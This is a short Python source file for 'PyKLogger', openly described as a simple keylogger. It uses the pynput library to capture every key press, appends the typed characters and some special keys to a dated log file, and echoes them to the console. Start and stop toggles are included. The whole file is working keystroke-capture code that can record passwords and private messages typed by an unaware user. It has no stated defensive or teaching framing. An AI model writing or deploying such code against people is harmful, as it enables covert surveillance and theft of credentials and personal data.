'''
    PyKLogger, a simple key logger program written in Python
    Author: Ada_92
'''
import os

from datetime import datetime
from pynput.keyboard import Key, Listener, Controller

board = Controller()
now = datetime.now()
filePath = os.path.dirname(__file__)
logPath = os.path.join(filePath, "log", now.strftime("%Y-%m-%d")+".txt")
is_record = True

def on_press(key):
    if is_record:
        with open(logPath, 'a') as logger:
            try:
                print('User pressed:', key.char)
                logger.write(key.char)

            except AttributeError:
                editor_key = {
                    Key.enter: "\n",
                    Key.tab: "\t",
                    Key.space: " ",
                    Key.backspace: "\\back_space"
                }
                if key in editor_key.keys():
                    logger.write(editor_key[key])

                print("Special key ", key)


def on_release(key):
    if is_record:
        print('{0} released'.format(key))


listener = Listener(on_press=on_press, on_release=on_release)
def start():
    global is_record
    is_record = True
    if not listener.running:
        listener.start()
    else:
        print("Started")


def stop():
    global is_record
    is_record = False
    print("Stop PyKLogger")


def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
